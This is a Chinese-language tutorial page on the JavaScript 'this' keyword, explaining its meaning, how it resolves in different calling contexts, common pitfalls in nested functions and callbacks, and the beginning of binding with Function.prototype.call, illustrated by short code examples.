<h2 id="JS面向对象编程"><a href="#JS面向对象编程" class="headerlink" title="JS面向对象编程"></a>JS面向对象编程</h2><h3 id="2-this关键字"><a href="#2-this关键字" class="headerlink" title="2. this关键字"></a>2. this关键字</h3><h4 id="2-1-涵义"><a href="#2-1-涵义" class="headerlink" title="2.1 涵义"></a>2.1 涵义</h4><p><code>this</code>关键字是一个非常重要的语法点。毫不夸张地说，不理解它的含义，大部分开发任务都无法完成。<br>前一章已经提到，<code>this</code>可以用在构造函数之中，表示实例对象。除此之外，<code>this</code>还可以用在别的场合。但不管是什么场合，<code>this</code>都有一个共同点：它总是返回一个对象。<br>简单说，<code>this</code>就是属性或方法“当前”所在的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.property</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>this</code>就代表<code>property</code>属性当前所在的对象。<br>下面是一个实际的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  describe: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.describe()</span><br><span class="line"><span class="comment">// &quot;姓名：张三&quot;</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，<code>this.name</code>表示<code>name</code>属性所在的那个对象。由于<code>this.name</code>是在<code>describe</code>方法中调用，而<code>describe</code>方法所在的当前对象是<code>person</code>，因此<code>this</code>指向<code>person</code>，<code>this.name</code>就是<code>person.name</code>。<br>由于对象的属性可以赋给另一个对象，所以属性所在的当前对象是可变的，即<code>this</code>的指向是可变的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  describe: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  name: <span class="string">&#x27;李四&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">B.describe = A.describe;</span><br><span class="line">B.describe()</span><br><span class="line"><span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>A.describe</code>属性被赋给<code>B</code>，于是<code>B.describe</code>就表示<code>describe</code>方法所在的当前对象是<code>B</code>，所以<code>this.name</code>就指向<code>B.name</code>。<br>稍稍重构这个例子，<code>this</code>的动态指向就能看得更清楚。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="built_in">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  describe: f</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  name: <span class="string">&#x27;李四&#x27;</span>,</span><br><span class="line">  describe: f</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A.describe() <span class="comment">// &quot;姓名：张三&quot;</span></span><br><span class="line">B.describe() <span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>f</code>内部使用了<code>this</code>关键字，随着<code>f</code>所在的对象不同，<code>this</code>的指向也不同。<br>只要函数被赋给另一个变量，<code>this</code>的指向就会变。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  describe: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;李四&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> f = A.describe;</span><br><span class="line">f() <span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>A.describe</code>被赋值给变量<code>f</code>，内部的<code>this</code>就会指向<code>f</code>运行时所在的对象（本例是顶层对象）。<br>再看一个网页编程的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;age&quot;</span> size=<span class="number">3</span> onChange=<span class="string">&quot;validate(this, 18, 99);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">obj, lowval, hival</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ((obj.value &lt; lowval) || (obj.value &gt; hival))</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Invalid Value!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码是一个文本输入框，每当用户输入一个值，就会调用<code>onChange</code>回调函数，验证这个值是否在指定范围。浏览器会向回调函数传入当前对象，因此<code>this</code>就代表传入当前对象（即文本框），然后就可以从<code>this.value</code>上面读到用户的输入值。<br>总结一下，JavaScript 语言之中，一切皆对象，运行环境也是对象，所以函数都是在某个对象之中运行，<code>this</code>就是函数运行时所在的对象（环境）。这本来并不会让用户糊涂，但是 JavaScript 支持运行环境动态切换，也就是说，<code>this</code>的指向是动态的，没有办法事先确定到底指向哪个对象，这才是最让初学者感到困惑的地方。</p>
<h4 id="2-2-实质"><a href="#2-2-实质" class="headerlink" title="2.2 实质"></a>2.2 实质</h4><p>JavaScript 语言之所以有<code>this</code>的设计，跟内存里面的数据结构有关系。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>:  <span class="number">5</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>上面的代码将一个对象赋值给变量<code>obj</code>。JavaScript 引擎会先在内存里面，生成一个对象<code>&#123; foo: 5 &#125;</code>，然后把这个对象的内存地址赋值给变量<code>obj</code>。也就是说，变量<code>obj</code>是一个地址（reference）。后面如果要读取<code>obj.foo</code>，引擎先从<code>obj</code>拿到内存地址，然后再从该地址读出原始的对象，返回它的<code>foo</code>属性。<br>原始的对象以字典结构保存，每一个属性名都对应一个属性描述对象。举例来说，上面例子的<code>foo</code>属性，实际上是以下面的形式保存的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  foo: &#123;</span><br><span class="line">    [[value]]: <span class="number">5</span></span><br><span class="line">    [[writable]]: <span class="literal">true</span></span><br><span class="line">    [[enumerable]]: <span class="literal">true</span></span><br><span class="line">    [[configurable]]: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，<code>foo</code>属性的值保存在属性描述对象的<code>value</code>属性里面。<br>这样的结构是很清晰的，问题在于属性的值可能是一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125; &#125;;</span><br></pre></td></tr></table></figure>
<p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给<code>foo</code>属性的<code>value</code>属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  foo: &#123;</span><br><span class="line">    [[value]]: 函数的地址</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">f</span>: f &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独执行</span></span><br><span class="line">f()</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj 环境执行</span></span><br><span class="line">obj.f()</span><br></pre></td></tr></table></figure>
<p>JavaScript 允许在函数体内部，引用当前环境的其他变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。<br>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（context）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，函数体里面的<code>this.x</code>就是指当前运行环境的<code>x</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  f: f,</span><br><span class="line">  x: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独执行</span></span><br><span class="line">f() <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// obj 环境执行</span></span><br><span class="line">obj.f() <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>f</code>在全局环境执行，<code>this.x</code>指向全局环境的<code>x</code>；在<code>obj</code>环境执行，<code>this.x</code>指向<code>obj.x</code>。</p>
<h4 id="2-3-使用场合"><a href="#2-3-使用场合" class="headerlink" title="2.3 使用场合"></a>2.3 使用场合</h4><p><code>this</code>主要有以下几个使用场合。</p>
<h5 id="1-全局环境"><a href="#1-全局环境" class="headerlink" title="(1)全局环境"></a>(1)全局环境</h5><p>全局环境使用<code>this</code>，它指的就是顶层对象<code>window</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span> === <span class="built_in">window</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === <span class="built_in">window</span>);</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码说明，不管是不是在函数内部，只要是在全局环境下运行，<code>this</code>就是指顶层对象<code>window</code>。</p>
<h5 id="2-构造函数"><a href="#2-构造函数" class="headerlink" title="(2)构造函数"></a>(2)构造函数</h5><p>构造函数中的<code>this</code>，指的是实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Obj = <span class="function"><span class="keyword">function</span> (<span class="params">p</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.p = p;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码定义了一个构造函数<code>Obj</code>。由于<code>this</code>指向实例对象，所以在构造函数内部定义<code>this.p</code>，就相当于定义实例对象有一个<code>p</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> Obj(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br><span class="line">o.p <span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-对象的方法"><a href="#3-对象的方法" class="headerlink" title="(3)对象的方法"></a>(3)对象的方法</h5><p>如果对象的方法里面包含<code>this</code>，<code>this</code>的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变<code>this</code>的指向。<br>但是，这条规则很不容易把握。请看下面的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj =&#123;</span><br><span class="line">  foo: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo() <span class="comment">// obj</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.foo</code>方法执行时，它内部的<code>this</code>指向<code>obj</code>。<br>但是，下面这几种用法，都会改变<code>this</code>的指向。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line">(obj.foo = obj.foo)() <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line">(<span class="literal">false</span> || obj.foo)() <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 情况三</span></span><br><span class="line">(<span class="number">1</span>, obj.foo)() <span class="comment">// window</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.foo</code>就是一个值。这个值真正调用的时候，运行环境已经不是<code>obj</code>了，而是全局环境，所以<code>this</code>不再指向<code>obj</code><br>可以这样理解，JavaScript 引擎内部，<code>obj</code>和<code>obj.foo</code>储存在两个内存地址，称为地址一和地址二。<code>obj.foo()</code>这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一，<code>this</code>指向<code>obj</code>。但是，上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此<code>this</code>指向全局环境。上面三种情况等同于下面的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line">(obj.foo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line">(<span class="literal">false</span> || <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况三</span></span><br><span class="line">(<span class="number">1</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>如果<code>this</code>所在的方法不在对象的第一层，这时<code>this</code>只是指向当前一层的对象，而不会继承更上面的层。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  p: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  b: &#123;</span><br><span class="line">    m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.b.m() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a.b.m</code>方法在<code>a</code>对象的第二层，该方法内部的<code>this</code>不是指向<code>a</code>，而是指向<code>a.b</code>，因为实际执行的是下面的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> b = &#123;</span><br><span class="line">  m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="built_in">this</span>.p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  p: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  b: b</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(a.b).m() <span class="comment">// 等同于 b.m()</span></span><br></pre></td></tr></table></figure>
<p>如果要达到预期效果，只有写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.p);</span><br><span class="line">    &#125;,</span><br><span class="line">    p: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果这时将嵌套对象内部的方法赋值给一个变量，<code>this</code>依然会指向全局对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.p);</span><br><span class="line">    &#125;,</span><br><span class="line">    p: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hello = a.b.m;</span><br><span class="line">hello() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>m</code>是多层对象内部的一个方法。为求简便，将其赋值给<code>hello</code>变量，结果调用时，<code>this</code>指向了顶层对象。为了避免这个问题，可以只将<code>m</code>所在的对象赋值给<code>hello</code>，这样调用时，<code>this</code>的指向就不会变。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = a.b;</span><br><span class="line">hello.m() <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure>

<h4 id="2-4-使用注意点"><a href="#2-4-使用注意点" class="headerlink" title="2.4 使用注意点"></a>2.4 使用注意点</h4><h5 id="2-4-1-避免多层-this"><a href="#2-4-1-避免多层-this" class="headerlink" title="2.4.1 避免多层 this"></a>2.4.1 避免多层 this</h5><p>由于<code>this</code>的指向是不确定的，所以切勿在函数中包含多层的<code>this</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  f1: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">    &#125;();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.f1()</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">// Window</span></span><br></pre></td></tr></table></figure>
<p>上面代码包含两层<code>this</code>，结果运行后，第一层指向对象<code>o</code>，第二层指向全局对象，因为实际执行的是下面的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> temp = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  f1: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">var</span> f2 = temp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个解决方法是在第二层改用一个指向外层<code>this</code>的变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  f1: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(that);</span><br><span class="line">    &#125;();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.f1()</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">// Object</span></span><br></pre></td></tr></table></figure>
<p>上面代码定义了变量<code>that</code>，固定指向外层的<code>this</code>，然后在内层使用<code>that</code>，就不会发生<code>this</code>指向的改变。<br>事实上，使用一个变量固定<code>this</code>的值，然后内层函数调用这个变量，是非常常见的做法，请务必掌握。<br>JavaScript 提供了严格模式，也可以硬性避免这种问题。严格模式下，如果函数内部的<code>this</code>指向顶层对象，就会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  count: <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">counter.inc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">this</span>.count++</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> f = counter.inc;</span><br><span class="line">f()</span><br><span class="line"><span class="comment">// TypeError: Cannot read property &#x27;count&#x27; of undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>inc</code>方法通过<code>&#39;use strict&#39;</code>声明采用严格模式，这时内部的<code>this</code>一旦指向顶层对象，就会报错。</p>
<h5 id="2-4-2-避免数组处理方法中的-this"><a href="#2-4-2-避免数组处理方法中的-this" class="headerlink" title="2.4.2 避免数组处理方法中的 this"></a>2.4.2 避免数组处理方法中的 this</h5><p>数组的<code>map</code>和<code>foreach</code>方法，允许提供一个函数作为参数。这个函数内部不应该使用<code>this</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  v: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  p: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  f: <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.p.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.v + <span class="string">&#x27; &#x27;</span> + item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.f()</span><br><span class="line"><span class="comment">// undefined a1</span></span><br><span class="line"><span class="comment">// undefined a2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>foreach</code>方法的回调函数中的<code>this</code>，其实是指向<code>window</code>对象，因此取不到<code>o.v</code>的值。原因跟上一段的多层<code>this</code>是一样的，就是内层的<code>this</code>不指向外部，而指向顶层对象。<br>解决这个问题的一种方法，就是前面提到的，使用中间变量固定<code>this</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  v: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  p: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  f: <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">this</span>.p.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(that.v+<span class="string">&#x27; &#x27;</span>+item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.f()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure>
<p>另一种方法是将<code>this</code>当作<code>foreach</code>方法的第二个参数，固定它的运行环境</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  v: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  p: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  f: <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.p.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.v + <span class="string">&#x27; &#x27;</span> + item);</span><br><span class="line">    &#125;, <span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.f()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure>

<h5 id="2-4-3-避免回调函数中的-this"><a href="#2-4-3-避免回调函数中的-this" class="headerlink" title="2.4.3 避免回调函数中的 this"></a>2.4.3 避免回调函数中的 this</h5><p>回调函数中的<code>this</code>往往会改变指向，最好避免使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">o.f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 的写法</span></span><br><span class="line">$(<span class="string">&#x27;#button&#x27;</span>).on(<span class="string">&#x27;click&#x27;</span>, o.f);</span><br></pre></td></tr></table></figure>
<p>上面代码中，点击按钮以后，控制台会显示<code>false</code>。原因是此时<code>this</code>不再指向<code>o</code>对象，而是指向按钮的 DOM 对象，因为f方法是在按钮对象的环境中被调用的。这种细微的差别，很容易在编程中忽视，导致难以察觉的错误。<br>为了解决这个问题，可以采用下面的一些方法对<code>this</code>进行绑定，也就是使得<code>this</code>固定指向某个对象，减少不确定性。</p>
<h4 id="2-5-绑定-this-的方法"><a href="#2-5-绑定-this-的方法" class="headerlink" title="2.5 绑定 this 的方法"></a>2.5 绑定 this 的方法</h4><p><code>this</code>的动态切换，固然为 JavaScript 创造了巨大的灵活性，但也使得编程变得困难和模糊。有时，需要把<code>this</code>固定下来，避免出现意想不到的情况。JavaScript 提供了<code>call</code>、<code>apply</code>、<code>bind</code>这三个方法，来切换/固定<code>this</code>的指向。</p>
<h5 id="2-5-1-Function-prototype-call"><a href="#2-5-1-Function-prototype-call" class="headerlink" title="2.5.1 Function.prototype.call()"></a>2.5.1 Function.prototype.call()</h5><p>函数实例的<code>call</code>方法，可以指定函数内部<code>this</code>的指向（即函数执行时所在的作用域），然后在所指定的作用域中，调用该函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f() === <span class="built_in">window</span> <span class="comment">// true</span></span><br><span class="line">f.call(obj) === obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
